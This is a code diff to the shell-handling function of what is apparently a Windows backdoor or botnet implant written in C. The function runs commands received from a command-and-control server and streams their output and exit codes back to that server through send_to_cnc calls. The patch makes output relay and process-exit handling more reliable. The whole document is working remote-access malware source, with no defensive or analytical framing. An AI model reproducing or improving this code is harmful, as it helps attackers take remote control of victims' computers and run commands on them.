@@ -58,15 +58,25 @@ void handle_shell()
     cmd.cmd[cmd.cmd_len] = 0;
     log_info("Command: \"%s\"", cmd.cmd);
     shell(&cmd);
-    free(cmd.cmd);
-    send_to_cnc(&cmd.exit_code, sizeof(cmd.exit_code));
     while (TRUE)
     {
         bytes_read = read_shell_output(&cmd);
-        send_to_cnc(&bytes_read, sizeof(bytes_read));
-        if (!bytes_read)
+        if (bytes_read)
+        {
+            send_to_cnc(&bytes_read, sizeof(bytes_read));
+            send_to_cnc(cmd.out, bytes_read);
+        }
+        else if (WaitForSingleObject(cmd.proc_info.hProcess, 0) == WAIT_OBJECT_0)
+        {
+            send_to_cnc(&bytes_read, sizeof(bytes_read));
+            GetExitCodeProcess(cmd.proc_info.hProcess, &cmd.exit_code);
+            CloseHandle(cmd.proc_info.hProcess);
+            CloseHandle(cmd.proc_info.hThread);
+            log_info("\"%s\" exited with %d", cmd.cmd, cmd.exit_code);
+            free(cmd.cmd);
+            send_to_cnc(&cmd.exit_code, sizeof(cmd.exit_code));
             return;
-        send_to_cnc(cmd.out, bytes_read);
+        }
     }
 }
 
